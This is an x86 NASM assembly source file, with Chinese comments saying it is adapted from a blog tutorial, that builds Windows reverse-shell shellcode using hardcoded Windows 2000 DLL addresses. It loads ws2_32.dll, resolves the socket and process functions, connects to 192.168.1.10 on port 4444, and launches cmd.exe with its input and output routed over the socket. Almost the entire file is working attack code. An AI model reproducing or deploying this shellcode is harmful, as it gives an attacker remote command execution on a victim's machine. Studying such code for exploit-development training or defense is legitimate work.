;这个代码是根据https://h0mbre.github.io/Win32_Reverse_Shellcode/#进行修改的
;很多的寻找地址部分都是手动找windows2000下相关dll的地址得到的
;通过x32dbg得到这些地址的
global_start

section .text
_start:

;have the base address of kernel32.dll in ESI as per usual
mov esi, 0x7c4dffff
add esi, 1
mov ebx, esi
mov ecx, esi
mov edx, esi

;Getting Address of GetProcAddress
Get_Function:

mov edi, 0x7c4ee6a9 ;have the address of GetProcAddress stored in EDI

;use GetProcAddress to find LoadLibraryA
;We have to push the string LoadLibraryA onto the stack first
mov eax, 0x7c4f05cf ; the address of LoadLibraryA is stored in EAX

;We can can use this function to load library ws2_32.dll into memory
;This library holds all of the socket functions we need to establish a reverse shell

;Loading ws2_32.dll
;use LoadLibraryA to load the ws2_32.dll
;We have to push the string ws2_32.dll onto the stack
push 0x61616c6c 
sub word [esp+0x2], 0x6161
push 0x642e3233
push 0x5f327377
push esp
call eax

;EAX = ws2_32.dll address
;ECX = ???
;EDX = some sort of offset
;EBX = kernel32 base address
;ESP = pointer to string ws2_32.dll
;ESI = some address
;EDI = GetProcAddress address

;use GetProcAddress to get location of WSAStartup function
push 0x61617075
sub word [esp + 0x2], 0x6161
push 0x74726174
push 0x53415357
push esp
push eax
call edi

;WSAStartup is stored in EAX
push eax
lea esi, [esp] ; esi will store WSAStartup location, and we'll calculate offsets from here

;use GetProcAddress to get location of WSASocketA function
push 0x61614174

sub word [esp + 0x2], 0x6161
push 0x656b636f
push 0x53415357
push esp
push ecx
call edi

mov [esi+0x4], eax ;esi at offset 0x4 will now hold the address of WSASocketA

;use GetProcAddress to get location of connect function
push 0x61746365
sub dword [esp + 0x3], 0x61
push 0x6e6e6f63
push esp
push ecx
call edi

mov [esi+0x8], eax  ;esi at offset 0x4 will now hold the address of connect

;use GetProcAddress to get location of CreateProcessA function
push 0x61614173
sub word [esp + 0x2], 0x6161
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push ebx
call edi

mov [esi+0xc], eax ; esi at offset 0xc will now hold the address of CreateProcessA

;use GetProcAddress to get location of ExitProcAddress function
push 0x61737365
sub dword [esp + 0x3], 0x61
push 0x636f7250
push 0x74697845
push esp
push ebx
call edi

mov [esi+0x10], eax ; esi at offset 0x10 will now hold the address of ExitProcAddress

; call WSAStartup
xor edx,edx
mov dx, 0x0190
sub esp, edx
push esp
push edx
call dword [esi]

;call WSASocket
push eax
push eax
push eax
xor edx, edx
mov dl, 0x6
push edx
inc eax
push eax
inc eax
push eax
;call dword [esi + 0x4]
mov ebx, 0x7503c963
call ebx

;call connect
push 0xa01a8c0 ; sin_address set to 192.168.1.10
push word 0x5c11 ;port = 4444
xor ebx,ebx
add bl, 0x2
push word bx
mov edx,esp
push byte 16
push edx
push eax
xchg eax, edi
;call dword [esi+0x8]
mov ebx, 0x7503c1b9
call ebx

;CreateProcessA 
push 0x61646d63 ; "cmda"
sub dword [esp+0x3], 0x61 ; "cmd"
mov edx, esp ;edx now pointer to "cmd" string

;set up the STARTUPINFO struct
push edi
push edi
push edi ;we just pust our SOCKET_FD into the arg params for HANDLE hStdInput; HANDLE hstdError
xor ebx,ebx
xor ecx,ecx
add cl, 0x12 ;we're going to throw 0x00000000 onto the stack 18 times, this will fill up both the STARTUPINFO and PROCESS_INFORMATION structs
;then we will retroactively fill them up with the arguments we need by using effective addressing relative to ESP like mov word [esp +]

looper:
push ebx
loop looper


mov word [esp + 0x3c], 0x0101 ; set
mov byte [esp+0x10], 0x44
lea eax, [esp+0x10]

; Actually Calling CreateProcessA now
push esp ;pointer to PROCESS_INFORMATION
push eax ;pointer to STARTUPINFO
push ebx ;all NULLs
push ebx
push ebx
inc ebx ;bInheritHandles == True
push ebx
dec ebx
push ebx
push ebx
push edx
push ebx
call dword [esi+0xc]

;call ExitProcess
push ebx
call dword [esi+0x10] 

